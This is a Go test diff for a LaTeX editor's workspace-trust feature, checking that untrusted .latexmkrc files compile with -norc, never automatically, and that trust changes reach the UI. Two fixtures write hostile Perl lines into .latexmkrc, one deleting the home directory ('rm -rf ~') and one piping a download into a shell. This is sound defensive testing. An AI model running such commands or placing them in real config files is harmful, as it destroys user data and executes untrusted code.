@@ -18,6 +18,7 @@ import (
 	"github.com/stretchr/testify/require"
 	"github.com/wailsapp/wails/v2/pkg/menu"
 
+	"creative-ink/internal/compiler"
 	"creative-ink/internal/config"
 	"creative-ink/internal/core"
 	"creative-ink/internal/system"
@@ -1371,4 +1372,133 @@ func TestRapidAutoRequestsCancelTheObsoleteRun(t *testing.T) {
 
 	expectNoEvent(t, events) // 3 requests → 2 runs: no third compilation
 	assert.EqualValues(t, 2, runs.Load())
+}
+
+// ── Trust (docs/MAP.md §4.6, step 3) ──────────────────────────────────────
+
+// noRCRecorder is a compile func that records whether latexmk would have
+// run with -norc.
+func noRCRecorder(seen chan<- bool) compileFunc {
+	return func(ctx context.Context, workdir, filename string) (string, error) {
+		seen <- compiler.CompileOptionsFrom(ctx).NoRC
+		return "ok", nil
+	}
+}
+
+func receiveNoRC(t *testing.T, seen <-chan bool) bool {
+	t.Helper()
+	select {
+	case v := <-seen:
+		return v
+	case <-time.After(2 * time.Second):
+		require.FailNow(t, "no compilation ran")
+		return false
+	}
+}
+
+func TestUntrustedLatexmkrcCompilesWithNoRCAndNeverAutomatically(t *testing.T) {
+	seen := make(chan bool, 8)
+	a, events := newTestApp(t, noRCRecorder(seen)) // compile.auto is on here
+	folder, doc := a.workspace()
+	rc := filepath.Join(folder, ".latexmkrc")
+	require.NoError(t, os.WriteFile(rc, []byte(`system("rm -rf ~");`), 0o644))
+
+	st, err := a.workspaceState()
+	require.NoError(t, err)
+	assert.Equal(t, core.TrustUntrusted, st.TrustStatus)
+	assert.Equal(t, []string{".latexmkrc"}, st.TrustFiles)
+
+	// compile.auto is on, but an untrusted folder never compiles on its own.
+	assert.False(t, a.RequestCompile("auto"))
+	_, err = a.OpenFile(doc)
+	require.NoError(t, err)
+	expectNoEvent(t, events) // no compile:started (no PDF on disk to show either)
+
+	// ⌘S compiles, in restricted mode.
+	require.True(t, a.RequestCompile("manual"))
+	assert.True(t, receiveNoRC(t, seen), "an untrusted .latexmkrc must be ignored (-norc)")
+	expectCompileOf(t, events, doc)
+}
+
+func TestTrustProjectRecompilesWithTheRCAndTracksChanges(t *testing.T) {
+	seen := make(chan bool, 8)
+	a, events := newTestApp(t, noRCRecorder(seen))
+	folder, doc := a.workspace()
+	rc := filepath.Join(folder, ".latexmkrc")
+	require.NoError(t, os.WriteFile(rc, []byte(`$pdf_mode = 5;`), 0o644))
+
+	st, err := a.TrustProject()
+	require.NoError(t, err)
+	assert.Equal(t, core.TrustTrusted, st.TrustStatus)
+	ev := nextEvent(t, events)
+	require.Equal(t, EventTrustChanged, ev.name)
+	changed := ev.data[0].(TrustChangedEvent)
+	assert.Equal(t, core.TrustTrusted, changed.Status)
+	assert.Equal(t, folder, changed.Project)
+	// The banner's button recompiles, now with the project's configuration.
+	assert.False(t, receiveNoRC(t, seen))
+	expectCompileOf(t, events, doc)
+	assert.True(t, a.RequestCompile("auto"), "a trusted folder compiles automatically again")
+	receiveNoRC(t, seen)
+	expectCompileOf(t, events, doc)
+
+	// The file changes (git pull): the next compilation is restricted and
+	// the UI is told.
+	require.NoError(t, os.WriteFile(rc, []byte(`system("curl x | sh");`), 0o644))
+	require.True(t, a.RequestCompile("manual"))
+	assert.True(t, receiveNoRC(t, seen))
+	// compile:started → trust:changed (found by this compilation) → finished.
+	require.Equal(t, EventCompileStarted, nextEvent(t, events).name)
+	ev = nextEvent(t, events)
+	require.Equal(t, EventTrustChanged, ev.name)
+	assert.Equal(t, core.TrustUntrusted, ev.data[0].(TrustChangedEvent).Status)
+	require.Equal(t, EventCompileFinished, nextEvent(t, events).name)
+}
+
+func TestUntrustProjectRestrictsWithoutAsking(t *testing.T) {
+	seen := make(chan bool, 8)
+	a, events := newTestApp(t, noRCRecorder(seen))
+	folder, doc := a.workspace()
+	require.NoError(t, os.WriteFile(filepath.Join(folder, "latexmkrc"), []byte("1;"), 0o644))
+
+	st, err := a.UntrustProject()
+	require.NoError(t, err)
+	assert.Equal(t, core.TrustRestricted, st.TrustStatus)
+	require.Equal(t, EventTrustChanged, nextEvent(t, events).name)
+
+	// Restricted is a decision: it compiles (also automatically), always -norc.
+	require.True(t, a.RequestCompile("auto"))
+	assert.True(t, receiveNoRC(t, seen))
+	expectCompileOf(t, events, doc)
+}
+
+func TestCiTrustFromTheTerminal(t *testing.T) {
+	a, events := newTestApp(t, okCompile)
+	folder, _ := a.workspace()
+	require.NoError(t, os.WriteFile(filepath.Join(folder, ".latexmkrc"), []byte("1;"), 0o644))
+
+	res, err := a.RunTerminalCommand("ci trust status")
+	require.NoError(t, err)
+	assert.Zero(t, res.ExitCode)
+	assert.Contains(t, res.Output, "sin confianza")
+	assert.Contains(t, res.Output, "Hash confiado: (ninguno)")
+
+	res, _ = a.RunTerminalCommand("ci trust add")
+	assert.Contains(t, res.Output, "✓ Confías")
+	require.Equal(t, EventTrustChanged, nextEvent(t, events).name, "the banner must disappear at once")
+	st, _ := a.workspaceState()
+	assert.Equal(t, core.TrustTrusted, st.TrustStatus)
+
+	res, _ = a.RunTerminalCommand("ci trust remove")
+	assert.Contains(t, res.Output, "restringida")
+	st, _ = a.workspaceState()
+	assert.Equal(t, core.TrustRestricted, st.TrustStatus)
+}
+
+func TestProjectWithoutRCIsTrusted(t *testing.T) {
+	a, _ := newTestApp(t, okCompile)
+	st, err := a.workspaceState()
+	require.NoError(t, err)
+	assert.Equal(t, core.TrustTrusted, st.TrustStatus)
+	assert.Empty(t, st.TrustFiles)
 }
